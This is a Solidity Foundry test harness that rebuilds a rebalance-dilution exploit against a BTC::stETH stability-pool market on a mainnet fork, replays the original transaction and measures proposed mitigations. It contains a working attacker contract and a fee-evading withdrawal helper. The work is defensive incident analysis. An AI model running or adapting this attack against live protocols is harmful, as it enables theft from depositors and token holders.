// SPDX-License-Identifier: MIT
pragma solidity >=0.8.28 <0.9.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {IBaoOwnable} from "@bao/interfaces/IBaoOwnable.sol";
import {IClaimReward} from "@harbor/interfaces/IClaimReward.sol";
import {IMinter} from "@harbor/interfaces/IMinter.sol";
import {IMinter_v3} from "@harbor/interfaces/IMinter_v3.sol";
import {IStabilityPool} from "@harbor/interfaces/IStabilityPool.sol";
import {IStabilityPoolManager} from "@harbor/interfaces/IStabilityPoolManager.sol";
import {IStabilityPoolManager_v2} from "@harbor/interfaces/IStabilityPoolManager_v2.sol";
import {IWrappedPriceOracle} from "@harbor/interfaces/IWrappedPriceOracle.sol";

import {ConfigTokenNames} from "@harbor-script/config/ConfigTokenNames.sol";
import {ConfigMarket_BTC_stETH_mainnet} from "@harbor-script/config/markets/ConfigMarket_BTC_stETH_mainnet.sol";

import {HarborDeployRun} from "@harbor-test/HarborDeployRun.sol";
import {DeployedMarket} from "@harbor-test/harness/DeployedMarket.sol";
import {MarketAddresses} from "@harbor-test/harness/MarketAddresses.sol";
import {MarketReaderV2Lineage} from "@harbor-test/harness/MarketReader.sol";

/// @notice The attack of 2026-10-16 on BTC::stETH, rebuilt from its events to pursue its goal rather than repeat its
///         amounts. It mints as the exploit did, deposits its pegged tokens in the leveraged stability pool, redeems
///         leveraged tokens until the collateral ratio reaches `TARGET_COLLATERAL_RATIO` or the minter redeems no
///         further, rebalances, and turns everything back into wrapped collateral. Under a mitigation it therefore does
///         the best the mitigated market allows, which is what a mitigation has to withstand.
contract RebalanceDilutionAttacker {
    /// @dev Just below 20/19, the collateral ratio at which Minter_v2's leverage ratio reaches its cap of 20.
    uint256 internal constant TARGET_COLLATERAL_RATIO = 1.05 ether;
    /// @dev The exploit's own mint sizes, in wrapped collateral: one leveraged mint, then four pegged mints.
    uint256 internal constant LEVERAGED_MINT = 108.5 ether;
    uint256 internal constant PEGGED_MINT = 80 ether;
    uint256 internal constant PEGGED_MINT_LAST = 1.5 ether;
    /// @dev Enough passes for a redemption loop to reach its target or a disallowed band.
    uint256 internal constant MAX_PASSES = 8;

    /// @notice What the rebalance did, read around it.
    struct RebalanceRecord {
        bool rebalanced;
        uint256 collateralRatio;
        uint256 leveragedPrice;
        uint256 peggedConverted;
        uint256 leveragedMinted;
    }

    address internal immutable MINTER;
    address internal immutable PEGGED;
    address internal immutable LEVERAGED;
    address internal immutable WRAPPED_COLLATERAL;
    address internal immutable LEVERAGED_POOL;
    address internal immutable MANAGER;

    RebalanceRecord internal _record;

    constructor(MarketAddresses memory market) {
        MINTER = market.minter;
        PEGGED = market.pegged;
        LEVERAGED = market.leveraged;
        WRAPPED_COLLATERAL = market.wrappedCollateral;
        LEVERAGED_POOL = market.leveragedPool;
        MANAGER = market.manager;
    }

    function record() external view returns (RebalanceRecord memory) {
        return _record;
    }

    /// @param poolAccount The account the pegged deposit is made for: this contract, or an `OpenWindowWithdrawer`
    ///        whose withdrawal window is open, so the deposit leaves the pool without the early-withdrawal fee.
    function attack(address poolAccount) external {
        // The minter takes the wrapped collateral in and burns the pegged and leveraged tokens redeemed.
        IERC20(WRAPPED_COLLATERAL).approve(MINTER, type(uint256).max);
        IERC20(PEGGED).approve(MINTER, type(uint256).max);
        IERC20(LEVERAGED).approve(MINTER, type(uint256).max);
        IERC20(PEGGED).approve(LEVERAGED_POOL, type(uint256).max);

        IMinter(MINTER).mintLeveragedToken(LEVERAGED_MINT, address(this), 0);
        IMinter(MINTER).mintPeggedToken(PEGGED_MINT, address(this), 0);
        IMinter(MINTER).mintPeggedToken(PEGGED_MINT, address(this), 0);
        IMinter(MINTER).mintPeggedToken(PEGGED_MINT, address(this), 0);
        IMinter(MINTER).mintPeggedToken(PEGGED_MINT_LAST, address(this), 0);

        IStabilityPool(LEVERAGED_POOL).deposit(IERC20(PEGGED).balanceOf(address(this)), poolAccount, 0);

        // Lower the collateral ratio by redeeming leveraged tokens: each pass redeems what takes the ratio to the
        // target at the current leveraged price, and the loop ends when the target is reached or the minter would
        // redeem nothing.
        for (uint256 pass = 0; pass < MAX_PASSES; ++pass) {
            uint256 collateralRatio = IMinter(MINTER).collateralRatio();
            if (collateralRatio <= TARGET_COLLATERAL_RATIO) {
                break;
            }
            uint256 peggedValueToRemove = Math.mulDiv(
                IMinter(MINTER).peggedTokenBalance(),
                collateralRatio - TARGET_COLLATERAL_RATIO,
                1 ether
            );
            uint256 leveragedIn = Math.min(
                Math.mulDiv(peggedValueToRemove, 1 ether, IMinter(MINTER).leveragedTokenPrice()),
                IERC20(LEVERAGED).balanceOf(address(this))
            );
            (, , uint256 redeemable, , , ) = IMinter(MINTER).redeemLeveragedTokenDryRun(leveragedIn);
            if (redeemable == 0) {
                break;
            }
            IMinter(MINTER).redeemLeveragedToken(leveragedIn, address(this), 0);
        }

        if (IStabilityPoolManager(MANAGER).rebalanceable()) {
            uint256 leveragedSupply = IMinter(MINTER).leveragedTokenBalance();
            uint256 poolAssets = IStabilityPool(LEVERAGED_POOL).totalAssetSupply();
            _record.collateralRatio = IMinter(MINTER).collateralRatio();
            _record.leveragedPrice = IMinter(MINTER).leveragedTokenPrice();
            IStabilityPoolManager(MANAGER).rebalance(address(this), 0);
            _record.rebalanced = true;
            _record.leveragedMinted = IMinter(MINTER).leveragedTokenBalance() - leveragedSupply;
            _record.peggedConverted = poolAssets - IStabilityPool(LEVERAGED_POOL).totalAssetSupply();
        }

        if (poolAccount == address(this)) {
            IClaimReward(LEVERAGED_POOL).claim();
            IStabilityPool(LEVERAGED_POOL).withdraw(type(uint256).max, address(this), 0);
        } else {
            address[] memory rewardTokens = new address[](2);
            rewardTokens[0] = WRAPPED_COLLATERAL;
            rewardTokens[1] = LEVERAGED;
            OpenWindowWithdrawer(poolAccount).cashOut(address(this), rewardTokens);
        }

        for (uint256 pass = 0; pass < MAX_PASSES; ++pass) {
            uint256 held = IERC20(LEVERAGED).balanceOf(address(this));
            if (held == 0) {
                break;
            }
            (, , uint256 redeemable, , , ) = IMinter(MINTER).redeemLeveragedTokenDryRun(held);
            if (redeemable == 0) {
                break;
            }
            IMinter(MINTER).redeemLeveragedToken(held, address(this), 0);
        }

        uint256 pegged = IERC20(PEGGED).balanceOf(address(this));
        if (pegged > 0) {
            IMinter(MINTER).redeemPeggedToken(pegged, address(this), 0);
        }
    }
}

/// @notice A stability pool account whose withdrawal window is open: deposits made for it leave the pool without the
///         early-withdrawal fee. Opening a window needs no balance, and a deposit cancels only its sender's request.
contract OpenWindowWithdrawer {
    using SafeERC20 for IERC20;

    address internal immutable POOL;

    constructor(address pool) {
        POOL = pool;
    }

    function requestWithdrawal() external {
        IStabilityPool(POOL).requestWithdrawal();
    }

    /// @notice Claim the account's rewards, pass them and its whole deposit to `to`.
    function cashOut(address to, address[] calldata rewardTokens) external {
        IClaimReward(POOL).claim();
        for (uint256 i = 0; i < rewardTokens.length; ++i) {
            IERC20(rewardTokens[i]).safeTransfer(to, IERC20(rewardTokens[i]).balanceOf(address(this)));
        }
        IStabilityPool(POOL).withdraw(type(uint256).max, to, 0);
    }
}

/// @notice BTC::stETH as it stood immediately before the exploit of 2026-10-16, on a fork at that transaction, with
///         the exploit's own transaction, a rebuilt attacker to run against it, and the mitigations to put in its way.
///         The tests in `RebalanceDilution.t.sol` and the figures campaign in `script/verify/incidents/` both stand on
///         it, so a mitigation is installed the same way wherever it is measured.
abstract contract RebalanceDilutionFork is DeployedMarket {
    /// @dev The exploit. Forking at it gives the state just before it ran; no earlier transaction in its block
    ///      touched the market.
    bytes32 internal constant EXPLOIT_TX = 0xb8701591c0fa3ee44a9f42379d167261f70e0532f7c0cea6fcda26ef999df3db;
    /// @dev The account the exploit paid, and what it paid it: the transaction's last wrapped collateral transfer.
    address internal constant EXPLOIT_SENDER = 0x61F31C7B10ab421dD45aaC97813286A5Ed8aA880;
    uint256 internal constant EXPLOIT_PROCEEDS = 6.425312520857398299 ether;
    /// @dev The wrapped collateral the exploit borrowed to run with.
    uint256 internal constant ATTACK_CAPITAL = 350 ether;
    /// @dev Minter_v2's `_LEVERAGE_RATIO_CAP`, which is private: the leveraged tokens its capped conversion pays per
    ///      pegged token.
    uint256 internal constant LEVERAGE_RATIO_CAP = 20;
    /// @dev The collateral ratio below which the proposed configuration refuses leveraged redemptions.
    uint256 internal constant REDEMPTION_FLOOR = 1.1 ether;
    /// @dev The early-withdrawal fee proposed after the incident.
    uint256 internal constant EARLY_WITHDRAWAL_FEE = 0.05 ether;

    ConfigMarket_BTC_stETH_mainnet internal btcStEth;

    /// @notice What an attack left behind.
    struct Outcome {
        int256 attackerGain;
        uint256 leveragedPriceBefore;
        uint256 leveragedPriceAfter;
        RebalanceDilutionAttacker.RebalanceRecord rebalance;
    }

    function setUp() public virtual {
        vm.createSelectFork(vm.rpcUrl("mainnet"), EXPLOIT_TX);
        // After the fork is selected, which would otherwise discard it.
        productionRun = new HarborDeployRun(address(0), address(0), SALT_PREFIX, "mainnet", HarborDeployRun.Cut.Whole);
        btcStEth = new ConfigMarket_BTC_stETH_mainnet();
        reader = new MarketReaderV2Lineage(ConfigTokenNames(address(btcStEth)));
        market = productionRun.marketAddresses(btcStEth);
        deployedOwner = IBaoOwnable(market.minter).owner();
    }

    /// @dev The pending upgrade: the minter to Minter_v3, and with it the manager to StabilityPoolManager_v2 and both
    ///      pools to StabilityPool_v3 - a rebalance needs all four, so `_upgradeMarketToV3` moves them together. The
    ///      deployed manager's rebalance terms are carried over to the manager the upgrade puts in its place, so an
    ///      attacker meets the same threshold and earns the same bounty as on chain. The `V3Rule` must be installed.
    function _upgradeToMinterV3() internal {
        assertEq(overrideLabel(), "_v3", "the V3 rule is installed");
        uint256 rebalanceThreshold = IStabilityPoolManager(market.manager).rebalanceThreshold();
        uint256 rebalanceBountyRatio = IStabilityPoolManager(market.manager).rebalanceBountyRatio();
        _upgradeMarketToV3(btcStEth);
        IStabilityPoolManager_v2(market.manager).updateRebalanceThreshold(rebalanceThreshold);
        IStabilityPoolManager_v2(market.manager).updateRebalanceBountyRatio(rebalanceBountyRatio);

        (uint256 recorded, uint256 held) = IMinter_v3(market.minter).impairment();
        assertLe(recorded, held, "the upgraded market is not halted by an impairment");
    }

    /// @dev Refuses leveraged redemptions below `floor` through the owner's `updateConfig`: band 0, below the first
    ///      bound, is the band where redemptions are refused, and the floor moves its bound up.
    function _refuseLeveragedRedemptionBelow(uint256 floor) internal {
        IMinter.Config memory config = IMinter(market.minter).config();
        assertEq(config.redeemLeveragedIncentiveConfig.incentiveRatios[0], 1 ether, "band 0 is refused");
        config.redeemLeveragedIncentiveConfig.collateralRatioBandUpperBounds[0] = floor;
        vm.startPrank(deployedOwner);
        IMinter(market.minter).updateConfig(config);
        vm.stopPrank();
    }

    /// @dev StabilityPool_v2 sets the early-withdrawal fee only in `initialize`, so "had it been `fee`" is written where
    ///      the leveraged pool stores it: the slot holding the fee address and the fee, found as the slot the fee
    ///      getter reads that holds both.
    function _setEarlyWithdrawalFee(uint256 fee) internal {
        address pool = market.leveragedPool;
        uint256 feeNow = IStabilityPool(pool).getEarlyWithdrawalFee();
        uint256 feeAddress = uint160(IStabilityPool(pool).getFeeAddress());
        vm.record();
        IStabilityPool(pool).getEarlyWithdrawalFee();
        (bytes32[] memory reads, ) = vm.accesses(pool);
        bytes32 feeSlot;
        for (uint256 i = 0; i < reads.length; ++i) {
            if (vm.load(pool, reads[i]) == bytes32((feeNow << 160) | feeAddress)) {
                feeSlot = reads[i];
            }
        }
        assertNotEq(feeSlot, bytes32(0), "the fee's slot");
        vm.store(pool, feeSlot, bytes32((fee << 160) | feeAddress));
        assertEq(IStabilityPool(pool).getEarlyWithdrawalFee(), fee, "the fee");
    }

    /// @dev Gives `withdrawer` a withdrawal window that is open now. The window a request opens starts `startDelay`
    ///      after it, so the request is made here and then moved back by that delay, which is the state a request made
    ///      `startDelay` earlier leaves: the slot is the one the request wrote that holds its start and end.
    function _openWithdrawalWindow(address withdrawer) internal {
        address pool = market.leveragedPool;
        (uint64 startDelay, uint64 endWindow) = IStabilityPool(pool).getWithdrawalWindow();
        vm.record();
        OpenWindowWithdrawer(withdrawer).requestWithdrawal();
        (, bytes32[] memory writes) = vm.accesses(pool);
        uint256 start = block.timestamp + startDelay;
        bytes32 requestSlot;
        for (uint256 i = 0; i < writes.length; ++i) {
            if (vm.load(pool, writes[i]) == bytes32(start | ((start + endWindow) << 64))) {
                requestSlot = writes[i];
            }
        }
        assertNotEq(requestSlot, bytes32(0), "the request's slot");
        vm.store(pool, requestSlot, bytes32(block.timestamp | ((block.timestamp + endWindow) << 64)));
    }

    /// @dev Replays the exploit on the market as it stands and returns the wrapped collateral it paid its sender.
    function _replay() internal returns (int256 senderGain) {
        uint256 before = IERC20(market.wrappedCollateral).balanceOf(EXPLOIT_SENDER);
        vm.transact(EXPLOIT_TX);
        senderGain = int256(IERC20(market.wrappedCollateral).balanceOf(EXPLOIT_SENDER)) - int256(before);
        console2.log("exploit sender's gain, wrapped collateral", senderGain);
    }

    /// @dev Funds `attacker` with the exploit's capital, runs it, and values what it ends with at the oracle's mid
    ///      price: wrapped collateral as it is, leveraged and pegged tokens at the minter's prices for them.
    function _runAttack(address attacker, address poolAccount) internal returns (Outcome memory outcome) {
        deal(market.wrappedCollateral, attacker, ATTACK_CAPITAL);
        outcome.leveragedPriceBefore = IMinter(market.minter).leveragedTokenPrice();

        RebalanceDilutionAttacker(attacker).attack(poolAccount);

        outcome.leveragedPriceAfter = IMinter(market.minter).leveragedTokenPrice();
        outcome.rebalance = RebalanceDilutionAttacker(attacker).record();

        (uint256 minPrice, uint256 maxPrice, uint256 minRate, uint256 maxRate) = IWrappedPriceOracle(market.oracle)
            .latestAnswer();
        // pegged per wrapped collateral, at the mid price and the mid rate
        uint256 wrappedPrice = Math.mulDiv(minPrice + maxPrice, minRate + maxRate, 4 ether);
        uint256 tokensValue = Math.mulDiv(
            IERC20(market.leveraged).balanceOf(attacker),
            IMinter(market.minter).leveragedTokenPrice(),
            1 ether
        ) + Math.mulDiv(IERC20(market.pegged).balanceOf(attacker), IMinter(market.minter).peggedTokenPrice(), 1 ether);
        uint256 endValue = IERC20(market.wrappedCollateral).balanceOf(attacker) +
            Math.mulDiv(tokensValue, 1 ether, wrappedPrice);
        outcome.attackerGain = int256(endValue) - int256(ATTACK_CAPITAL);

        console2.log("attacker's gain, wrapped collateral", outcome.attackerGain);
        console2.log("leveraged price before", outcome.leveragedPriceBefore);
        console2.log("leveraged price after ", outcome.leveragedPriceAfter);
        console2.log("rebalanced", outcome.rebalance.rebalanced);
        console2.log("collateral ratio at the rebalance", outcome.rebalance.collateralRatio);
        console2.log("leveraged price at the rebalance", outcome.rebalance.leveragedPrice);
        console2.log("pegged converted", outcome.rebalance.peggedConverted);
        console2.log("leveraged minted", outcome.rebalance.leveragedMinted);
    }

    /// @dev The rebalance converted the leveraged pool's pegged tokens at the fair rate - the pegged converted over
    ///      the leveraged price - and the leveraged holders' price did not fall.
    ///
    ///      The price is floored to the wei, so the true fair amount lies between pegged/(price + 1) and pegged/price.
    ///      The minter floors what it mints, and Minter_v2's route through the leverage ratio floors that ratio first,
    ///      which costs less than one more: so the amount minted may fall up to 2 below the lower end, and never rises
    ///      above the upper end.
    function _assertConvertedAtTheFairRate(Outcome memory outcome) internal pure {
        assertTrue(outcome.rebalance.rebalanced, "rebalanced");
        uint256 fairHigh = Math.mulDiv(outcome.rebalance.peggedConverted, 1 ether, outcome.rebalance.leveragedPrice);
        uint256 fairLow = Math.mulDiv(outcome.rebalance.peggedConverted, 1 ether, outcome.rebalance.leveragedPrice + 1);
        assertLe(outcome.rebalance.leveragedMinted, fairHigh, "no more than the fair conversion");
        assertGe(outcome.rebalance.leveragedMinted + 2, fairLow, "no less than the fair conversion");
        assertGe(outcome.leveragedPriceAfter, outcome.leveragedPriceBefore, "the leveraged holders are not diluted");
    }
}
